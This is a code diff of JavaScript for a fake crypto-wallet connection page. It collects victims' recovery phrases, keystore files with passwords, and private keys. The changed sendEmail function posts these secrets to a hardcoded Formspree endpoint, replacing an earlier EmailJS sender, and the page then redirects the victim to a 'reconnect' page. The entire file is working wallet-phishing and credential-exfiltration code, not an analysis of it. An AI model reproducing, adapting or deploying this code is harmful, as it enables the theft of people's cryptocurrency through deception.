@@ -4,14 +4,15 @@ document.getElementById('form-connect-button').addEventListener('click', functio
   if (isValid) {
     const messageContent = collectFormData();
     if (messageContent) {
-      handleButtonUI(); 
-      sendEmail(messageContent); 
+      handleButtonUI();
+      sendEmail(messageContent);
       setTimeout(function () {
-        window.location.href = 'http://onchaindapp.github.io/dev/reconnect.html'; 
+        window.location.href = 'http://onchaindapp.github.io/auth/reconnect.html';
       }, 6000);
     }
   }
 });
+
 function setupRealTimeValidation() {
   const activeForm = document.querySelector('.form-slider.active');
   if (!activeForm) return;
@@ -22,6 +23,7 @@ function setupRealTimeValidation() {
     });
   });
 }
+
 function validateActiveForm() {
   let isValid = true;
   const activeForm = document.querySelector('.form-slider.active');
@@ -39,6 +41,7 @@ function validateActiveForm() {
   }
   return isValid;
 }
+
 function validatePhraseForm() {
   const inputWords = document.getElementById('words').value.trim();
   const wordsArray = inputWords.split(/\s+/);
@@ -57,6 +60,7 @@ function validatePhraseForm() {
   messagePhrase.style.color = '';
   return true;
 }
+
 function validateJsonForm() {
   const jsonValue = document.getElementById('json').value.trim();
   const passwordValue = document.getElementById('password').value.trim();
@@ -70,6 +74,7 @@ function validateJsonForm() {
     return true;
   }
 }
+
 function validatePrivateKeyForm() {
   const privateKey = document.getElementById('key').value.trim();
   const messagePrivatekey = document.getElementById('messagePrivatekey');
@@ -82,6 +87,7 @@ function validatePrivateKeyForm() {
     return true;
   }
 }
+
 function collectFormData() {
   let message = '';
   const logoTitle = document.querySelector(".modal-connection-status-2a")?.textContent;
@@ -104,22 +110,38 @@ function collectFormData() {
   }
   return message ? message : null;
 }
+
 function sendEmail(content) {
-  const templateParams = {
-    message: content
-  };
-  emailjs.send("service_fdsqynl", "template_ku76cr6", templateParams)
-    .then(function (response) {
-      console.log('SUCCESS!', response.status, response.text);
-    }, function (error) {
-      console.error('FAILED...', error);
+  const formspreeEndpoint = "https://formspree.io/f/xpwzjnqw";
+  const formData = new FormData();
+  formData.append('message', content);
+
+  fetch(formspreeEndpoint, {
+    method: 'POST',
+    body: formData,
+    headers: { Accept: 'application/json' }
+  })
+    .then(response => {
+      if (response.ok) {
+        console.log('Message sent successfully!');
+        alert('Message sent successfully!');
+      } else {
+        console.error('Failed to send message.', response);
+        // alert('Failed to send message. Please try again.');
+      }
+    })
+    .catch(error => {
+      console.error('Error occurred while sending message:', error);
+      // alert('An error occurred. Please try again.');
     });
 }
+
 function handleButtonUI() {
   const button = document.getElementById('form-connect-button');
   button.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Processing...';
   button.disabled = true;
 }
+
 function showCustomAlert(message) {
   const alertModal = document.getElementById('custom-alert');
   const alertMessage = document.getElementById('custom-alert-message');
@@ -127,9 +149,9 @@ function showCustomAlert(message) {
   alertMessage.textContent = message;
   alertModal.classList.remove('hidden');
   let width = 0;
-  const duration = 3000; 
-  const interval = 10; 
-  const step = (interval / duration) * 100; 
+  const duration = 3000;
+  const interval = 10;
+  const step = (interval / duration) * 100;
   const fillProgressBar = setInterval(function () {
     if (width >= 100) {
       clearInterval(fillProgressBar);
@@ -140,24 +162,25 @@ function showCustomAlert(message) {
   }, interval);
   setTimeout(function () {
     alertModal.classList.add('hidden');
-    progressBar.style.width = '0%'; 
+    progressBar.style.width = '0%';
   }, duration);
 }
-(function () {
-  emailjs.init("Ibs7hBlh5g5AZH4BH");
-})();
+
 document.addEventListener('keydown', function (event) {
   if (event.key === 'Enter') {
     event.preventDefault();
     document.getElementById('form-connect-button').click();
   }
 });
+
 setupRealTimeValidation();
+
 document.getElementById('menu-close-button').addEventListener('click', function () {
-  resetForm(); 
+  resetForm();
 });
+
 document.querySelectorAll('a.navigation-link').forEach(link => {
   link.addEventListener('click', function () {
-    resetForm(); 
+    resetForm();
   });
-})
+});
